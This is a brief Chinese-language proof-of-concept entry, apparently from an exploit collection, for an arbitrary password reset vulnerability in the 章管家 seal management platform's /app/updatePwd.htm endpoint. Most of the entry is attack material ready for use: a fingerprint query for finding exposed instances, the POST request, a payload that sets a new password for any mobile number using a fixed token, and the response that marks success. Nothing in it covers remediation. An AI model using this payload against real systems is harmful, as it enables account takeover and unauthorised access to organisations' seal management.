# 章管家updatePwd.htm存在任意账号密码重置漏洞

章管家 ｜ 其他 ｜ —
- **指纹**：`app="章管家-印章智慧管理平台"`
- **请求**：`POST /app/updatePwd.htm HTTP/1.1`

**Payload**
```
mobile=18888888888&newPassword=12312dsa12&equipmentName=xxxxxx&version=4.0.0&token=dingtalk_token
```
- **响应特征**：200